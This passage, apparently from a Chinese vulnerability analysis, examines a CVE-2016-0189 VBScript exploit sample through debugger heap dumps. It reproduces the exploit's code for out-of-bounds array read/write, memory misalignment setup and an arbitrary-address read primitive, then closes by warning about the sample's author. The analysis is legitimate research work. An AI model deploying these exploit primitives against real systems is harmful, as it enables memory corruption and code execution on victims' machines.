    0506c6f0  0288200c 02888208 052a9f40 00000002
    0506c700  00000001 00000000 00000000 00000000
    ...
然后来看一下重新分配后的`arr4`。结合上面的注释我们可以注意到`0x052a9ed0`处原来是一个`tagSAFEARRAY`结构体，其实际占用的内存区间为`0x052a9ed0
~ 0x052a9ed0 + 0x30`。
随后`arr4`被重新定义，其`pvData`所需的内存大小为`0x30`，恰好占用了刚被释放的`tagSAFEARRAY`内存区域。
上述占位手法和`CVE-2018-8373`完全一致。
    // arr4 tagSAFEARRAY.pvData 大小为 0x30
    // 它重用了 arr2 中某个(本次调试时为 arr2(103))被释放的 tagSAFEARRAY 对应的内存块
    0:015> !heap -p -a 052a9ec0
        address 052a9ec0 found in
        _HEAP @ 360000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            052a9eb8 0007 0000  [00]   052a9ec0    00030 - (busy)
    // arr4 tagSAFEARRAY.pvData
    0:007> dd 052a9ec0
    052a9ec0  00000000 00000000 00000000 00000000 // arr4(0, 0)
    052a9ed0  00000000 00000000 00000000 00000000 // arr4(0, 1)
    052a9ee0  00000000 00000000 00000000 00000000 // arr4(0, 2)
    052a9ef0  27567e4f 88000000 00000000 00000000 // arr4(0, 3)
    052a9f00  00000000 0000000c 08800002 00000010 // arr4(0, 4)
    052a9f10  00000000 0529d5f8 00000001 00000000 // arr4(0, 5)
    052a9f20  00000001 00000000 27567e74 88000000 // arr4(0, 6) 被改写前
    052a9f30  00000000 00000000 00000000 0000000c
    0:005> dd 052a9ec0
    052a9ec0  00000000 00000000 00000000 00000000
    052a9ed0  00000000 00000000 00000000 00000000
    052a9ee0  00000000 00000000 00000000 00000000
    052a9ef0  27567e4f 88000000 00000000 00000000
    052a9f00  00000000 0000000c 08800002 00000010
    052a9f10  00000000 0529d5f8 00000001 00000000
    052a9f20  02880003 01d89a08 55555555 0000019e // arr4(0, 6) 被改写后
    052a9f30  00000000 00000000 00000000 0000000c
从下面的日志可以看到`arr2`的某个成员对应的`tagSAFEARRAY`被改写了，变成了一个第一维超长的二维数组。`pvData =
0529d5f8`, `LBound = 01d89a08`, 一维元素个数为`02880003`, 每个元素大小为`0x10`字节
    // 被改写的 arr2(x) tagSAFEARRAY, x此时未知
    // 可以看到第一维长度被改写为 02880003，LBound 被改写为 01d89a08
    0:005> dd 052a9f08 l8
    052a9f08  08800002 00000010 00000000 0529d5f8
    052a9f18  00000001 00000000 02880003 01d89a08 
    // 调试器内全局搜索 052a9f08
    0:005> s -d 0x0 l?0x7fffffff 052a9f08
    01db1a70  052a9f08 01d89ff4 01d40008 00000000  ..*.............
    0506c6e8  052a9f08 00000002 0288200c 02888208  ..*...... ......
    // 计算 x
    0:005> ? (0506c6e8-0506c060) / 10
    Evaluate expression: 104 = 00000068 // 第 104 个 arr2(i), 即 arr2(103)
    // x = 0x68 = 0n104，对应 arr2(103)
    0:005> dd 0506c060 + 68 * 10 l4
    0506c6e0  0288200c 02888208 052a9f08 00000002
随后遍历`arr2`数组成员来查找长度发生变化的成员，并保存对应的索引到`vul_index`，本次调试中`vul_index = 103`。
    For i = 0 To 1999
        If IsArray(arr2(i)) = True Then
            If UBound(arr2(i), 1) > 0 Then
                vul_index = i
                Exit For
            End If
    End If
并在上述基础上封装了两个越界读写函数。
    Function read(offset)
        read = Abs(arr2(vul_index)(lb_index + offset, 0))
    End Function
    Sub write(offset, value)
        arr2(vul_index)(lb_index + offset, 0) = value
    End Sub
## 实现错位操作
有了越界读写能力后，利用代码还需要准备一块可以用于错位读写的内存。
    Function prepare_rw_mem
        On Error Resume Next
        offset = 0
        mem_index = 0
        g_offset = 0
        prepare_rw_mem = False
        Do While offset  3 Then
                val_2 = read(offset + 1)
                val_3 = read(offset + 4)
                If val_2 = 3 And val_3 = 3 Then
                    g_offset = offset
                    write offset, "A"
                    Exit Do
                End If
            Else
                val_1 = 0
                val_2 = 0
                val_3 = 0
            End If
            offset = offset + 1
        Loop
        For i = 0 To 1999
            If find_rw_mem(arr2(i)) = True Then
                mem_index = i
                prepare_rw_mem = True
                Exit For
            End If
        Next
    End Function
上述代码描述了整个查找过程，我们可以看到利用代码借助超长数组`arr2(103)`去查找一个符合条件的成员索引，从代码的设计来看原作者想找的是一个紧邻`HEAP_ENTRY`结构的`arr2(i)(0,
0)`成员。随后将该索引保存到一个全局索引`g_offset`。接着将对应地址处的变量设为代表字符为`A`的`BSTR`对象。完成上述步骤后，代码又借助`arr2`去查找刚刚被设置的`BSTR`变量附近带有特征的内存，并将相应的索引保存到`mem_index`。
###  在调试器中看查找过程
我们在调试器中看一下相关过程。
以下是从`arr2(103)(LBound, 0)`开始的内存视角，可以看到本次调试中找到的`g_offset = 5`,`LBound =
01d89a08`。
随后一个`BSTR`变量`A`被写入`0529d648`对应的`0x10`字节
随后代码又以`arr2(i)(0, 0)`的视角来查找被写入的`BSTR`变量。本次调试中符合条件的`i = 107`，所以 `mem_index =
107`。
我们来感受一下相差`8`字节的精妙错位。
## 任意地址读取
在上述错位的基础上，利用代码借用`arr2(103)(LBound + 5, 0)`和`arr2(107)(0,
0)`两个不同的数组视角封装了一个任意地址读取函数`GetUint32`。
    Function GetUint32(addr)
        Dim value
        write g_offset, addr + 4
        arr2(mem_index)(0, 0) = 8
        value = LenB(arr2(vul_index)(lb_index + g_offset, 0))
        arr2(mem_index)(0, 0) = 0
        GetUint32 = value
    End Function
后续的操作和之前已经有过分析文章的
`CVE-2017-0149`、`CVE-2018-8174`和`CVE-2018-8373`基本一致，这里不再重复分析。
## 结语
本文我分析了一个可能是原始`CVE-2016-0189`利用文件的漏洞触发和利用细节。这些细节和该漏洞这几年在公众视野中的印象有所不同。从利用代码的编写风格来看，这个利用样本和`CVE-2017-0149`，`CVE-2018-8174`以及`CVE-2018-8373`应该是同一作者。这个作者深谙`vbscript`漏洞利用编写之道，在相关的几个在野利用中，他对`vbscript`的内存错位运用得淋漓尽致。
在漏洞利用的技巧方面，我非常佩服该作者。但从0day售卖/攻击的角度来看，这些被运用于实际攻击中的高级利用代码所产生的危害是巨大的。作者在牟利/定向攻击的同时，完全没有考虑到对网络安全大环境产生的严重影响。作者手上肯定还有其他高质量的脚本引擎漏洞，这里也请广大安全厂商引起警惕。
## 参考链接
[CVE-2014-6332分析文章](http://paper.seebug.org/240/)
[CVE-2016-0189分析文章](https://bbs.pediy.com/thread-228371.htm)
[CVE-2017-0149分析文章](http://blogs.360.cn/post/VBScript_vul_CH.html)
[CVE-2018-8174分析文章](https://bbs.pediy.com/thread-248477.htm)
[CVE-2018-8373分析文章](https://blog.trendmicro.com/trendlabs-security-intelligence/use-after-free-uaf-vulnerability-cve-2018-8373-in-vbscript-engine-affects-internet-explorer-to-run-shellcode/)